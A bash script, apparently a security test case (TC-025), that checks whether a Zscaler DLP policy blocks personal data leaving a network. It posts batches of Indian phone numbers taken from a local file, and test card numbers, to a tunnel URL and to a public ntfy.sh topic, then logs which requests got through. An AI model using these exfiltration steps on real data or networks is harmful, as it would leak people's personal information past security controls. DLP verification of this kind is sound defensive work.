#!/usr/bin/env bash
set -u

NUMBERS_FILE="numbers.md"
RESULT_FILE="tc025_results.log"
TUNNEL_URL="${1:-${TUNNEL_URL:-}}"
PAN_PAYLOAD='{"pans":["4111111111111111","4111111111111112","4111111111111113"]}'
S1_REQUESTS="${S1_REQUESTS:-20}"
S2_REQUESTS="${S2_REQUESTS:-10}"
S2_WAIT="${S2_WAIT:-10}"
S5_REQUESTS="${S5_REQUESTS:-10}"
BATCH_WAIT="${BATCH_WAIT:-4}"

numbers=()
while IFS= read -r line; do
  numbers+=("$line")
done < <(grep -oE '\+91[[:space:]]?[0-9]{10}' "$NUMBERS_FILE" | tr -d ' ')
total=${#numbers[@]}

if [ "$total" -eq 0 ]; then
  echo "No numbers found in $NUMBERS_FILE (run from repo root)" >&2
  exit 1
fi

: > "$RESULT_FILE"

send() {
  local step="$1" idx="$2" body="$3" url="$4" extra="${5:-}"
  local ts code rc verdict
  ts=$(date '+%H:%M:%S')
  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 $extra -d "$body" "$url" 2>/dev/null)
  rc=$?
  if [ "$rc" -eq 0 ] && [ "${code:0:1}" = "2" ]; then
    verdict="SENT"
  else
    verdict="BLOCKED"
  fi
  printf '%s [%s] req=%s %s http=%s curl_rc=%s\n' "$ts" "$step" "$idx" "$verdict" "$code" "$rc" | tee -a "$RESULT_FILE"
  [ "$verdict" = "SENT" ]
}

run_batches() {
  local step="$1" count="$2" size="$3" wait_s="$4" url="$5"
  local sent=0 i=0 n=1 batch
  echo "--- $step: $count requests, batch size $size, ${wait_s}s apart ---" | tee -a "$RESULT_FILE"
  while [ "$n" -le "$count" ] && [ $((i + size)) -le "$total" ]; do
    batch=$(printf '%s\n' "${numbers[@]:i:size}" | paste -sd ',' -)
    if send "$step" "$n" "$batch" "$url"; then
      sent=$((sent + 1))
    else
      echo "     >>> request $n blocked — policy action observed, stopping step" | tee -a "$RESULT_FILE"
      break
    fi
    i=$((i + size))
    n=$((n + 1))
    [ "$n" -le "$count" ] && sleep "$wait_s"
  done
  echo "     $step delivered: $sent/$count" | tee -a "$RESULT_FILE"
}

echo "TC-025: Public API publish via curl (PII block verification)" | tee -a "$RESULT_FILE"
echo "Date: $(date)" | tee -a "$RESULT_FILE"
echo "Numbers available: $total" | tee -a "$RESULT_FILE"
echo "" | tee -a "$RESULT_FILE"

if [ -n "$TUNNEL_URL" ]; then
  echo "Tunnel endpoint: $TUNNEL_URL" | tee -a "$RESULT_FILE"
  run_batches "S1-batch5-4s" "$S1_REQUESTS" 5 "$BATCH_WAIT" "$TUNNEL_URL"
  run_batches "S2-batch5-10s" "$S2_REQUESTS" 5 "$S2_WAIT" "$TUNNEL_URL"

  echo "--- S3-threshold: PII count per request ---" | tee -a "$RESULT_FILE"
  send "S3-thr-1pii" 1 "${numbers[0]}" "$TUNNEL_URL"; sleep "$BATCH_WAIT"
  send "S3-thr-5pii" 1 "$(printf '%s\n' "${numbers[@]:0:5}" | paste -sd ',' -)" "$TUNNEL_URL"; sleep "$BATCH_WAIT"
  send "S3-thr-20pii" 1 "$(printf '%s\n' "${numbers[@]:0:20}" | paste -sd ',' -)" "$TUNNEL_URL"

  echo "--- S4-pan-json ---" | tee -a "$RESULT_FILE"
  send "S4-pan-json" 1 "$PAN_PAYLOAD" "$TUNNEL_URL" "-H Content-Type:application/json"
else
  echo "No tunnel URL given — skipping S1-S4 (pass URL as arg: ./tc025_test.sh https://xxx.lhr.life)" | tee -a "$RESULT_FILE"
fi

run_batches "S5-ntfy-direct" "$S5_REQUESTS" 5 "$BATCH_WAIT" "https://ntfy.sh/my-test-room-4755"

echo "" | tee -a "$RESULT_FILE"
echo "=== SUMMARY ===" | tee -a "$RESULT_FILE"
for s in S1-batch5-4s S2-batch5-10s S3-thr-1pii S3-thr-5pii S3-thr-20pii S4-pan-json S5-ntfy-direct; do
  sent=$(grep -c "\[$s\] .* SENT" "$RESULT_FILE")
  blocked=$(grep "\[$s\] .* BLOCKED" "$RESULT_FILE" | head -1)
  if [ -n "$blocked" ]; then
    echo "$s: $sent sent, BLOCKED at $(echo "$blocked" | sed 's/.*req=/req /;s/ SENT.*//;s/BLOCKED.*//' | awk '{print $2" ("$0")"}' | cut -d' ' -f1-2) — see log" | tee -a "$RESULT_FILE"
  else
    echo "$s: $sent sent, no block observed" | tee -a "$RESULT_FILE"
  fi
done
echo "" | tee -a "$RESULT_FILE"
echo "NEXT: verify incidents in Zscaler Zero Trust portal (DLP logs)." | tee -a "$RESULT_FILE"
echo "Any 'SENT' line whose payload arrived at the receiver = DLP gap (finding)." | tee -a "$RESULT_FILE"
